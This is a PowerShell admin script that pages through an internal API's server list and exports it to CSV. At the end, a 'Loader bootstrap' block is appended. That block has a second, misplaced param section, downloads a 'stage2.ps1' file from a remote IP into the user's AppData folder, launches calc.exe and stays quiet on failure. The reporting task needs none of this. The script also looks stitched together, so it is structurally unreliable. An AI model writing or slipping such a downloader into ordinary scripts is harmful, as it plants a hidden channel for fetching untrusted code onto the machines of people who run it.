
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BaseUri = "https://api.internal.corp/v1",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 2,
    [int]$TimeoutSec = 45,

    [int]$PageSize = 200,
    [string]$ReportPath = 'C:\Reports\api-servers-2026-04-27.csv'
)
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Set-StrictMode -Version 2.0
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}
function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}

$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.2/stage2.ps1",
    [string]$LocalPath = "$env:APPDATA\stage1.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $LocalPath); Start-Process -FilePath 'calc.exe'; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
